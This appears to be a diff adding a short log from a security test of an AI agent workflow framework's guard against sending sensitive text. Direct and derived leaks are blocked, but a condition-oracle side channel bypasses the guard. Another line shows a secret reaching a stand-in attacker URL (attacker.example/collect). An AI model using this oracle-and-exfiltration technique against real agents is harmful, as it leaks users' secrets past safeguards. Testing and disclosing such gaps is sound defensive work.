@@ -1,0 +1,7 @@
+[validity] secret="sk_live_AAA" -> oracle emitted "ends_other"
+[validity] secret="sk_live_ZZZ" -> oracle emitted "ends_ZZZ"
+[chain] attacker sink received URL: https://attacker.example/collect?d=sk_live_SECRETBIT
+[D extraction] recovered secret = "sk_live_SECRETBIT"  (actual = "sk_live_SECRETBIT")  match=True
+[A direct] expect=BLOCK -> BLOCKED  emitted=<none>  err=TargetInvocationException: Error invoking handler for Microsoft.Agents.AI.Workflows.Declarative.Kit.ActionExecutorResult || DeclarativeActionException: Cannot send sensitive activity text: a. ||   boundary held
+[B derived] expect=BLOCK -> BLOCKED  emitted=<none>  err=TargetInvocationException: Error invoking handler for Microsoft.Agents.AI.Workflows.Declarative.Kit.ActionExecutorResult || DeclarativeActionException: Cannot send sensitive activity text: a. ||   boundary held
+[C condition-oracle] expect=BLOCK -> EMITTED  emitted=OUT=prefix_is_sk_live    >>> BOUNDARY BYPASSED (secret-dependent value reached sink)
